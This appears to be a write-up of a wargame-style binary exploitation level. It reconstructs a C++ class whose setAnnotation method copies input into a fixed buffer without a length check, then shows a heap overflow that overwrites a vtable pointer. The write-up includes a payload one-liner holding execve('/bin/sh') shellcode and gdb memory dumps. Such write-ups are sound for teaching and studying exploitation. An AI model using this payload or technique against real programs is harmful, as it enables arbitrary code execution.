
Reconstructed C++ source from assembly (approx) :

```cpp
#include <string.h>
#include <memory.h>

class Foo {
    public:
        Foo(int value) : value(value), buffer() {}

        void setAnnotation(const char *str) {
            memcpy(buffer, str, strlen(str));
        }

        virtual int operator+(const Foo& rhs) {
            return value + rhs.value;
        }

        virtual int operator-(const Foo& rhs) {
            return value - rhs.value;
        }

    private:
        char buffer[100];
        int value;
};

int main(int argc, char **argv) {
    if (argc != 2) {
        return 1;
    }

    Foo *instance1 = new Foo(5);
    Foo *instance2 = new Foo(6);

    const int v = *instance1 + *instance2;
}
```

Memory layout of the two class :

```
0x804a008:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071

0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
```

Since the class contains **virtual functions**, the compiler has added a **virtual pointer** that points to a **virtual table**, that contains the address of the two method that are virtual : the *plus* and *minus* sign that are overloaded.

The `setAnnotation` method is unsafe and can overflow if the size of the string exceed the buffer allocated in the class. By overflowing the `buffer`, we can actually overwrite the **virtual pointer** of the second instance. We can make it point to a *fake* **vtable** that has an entry that points to a *shellcode*.

Let's try with the payload generated by the following command :

```bash
$(python -c 'print("\x10\xA0\x04\x08" + "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80" + "#"*81 + "\x0C\xA0\x04\x08")')
```

```
(gdb) x/56wx 0x804a008
0x804a008:	0x08048848	0x0804a010	0x6850c031	0x68732f2f
0x804a018:	0x69622f68	0x89e3896e	0xb0c289c1	0x2380cd0b
0x804a028:	0x23232323	0x23232323	0x23232323	0x23232323
0x804a038:	0x23232323	0x23232323	0x23232323	0x23232323
0x804a048:	0x23232323	0x23232323	0x23232323	0x23232323
0x804a058:	0x23232323	0x23232323	0x23232323	0x23232323
0x804a068:	0x23232323	0x23232323	0x23232323	0x23232323

0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
```

The vpointer of `instance2` now points to `0x0804a00c`.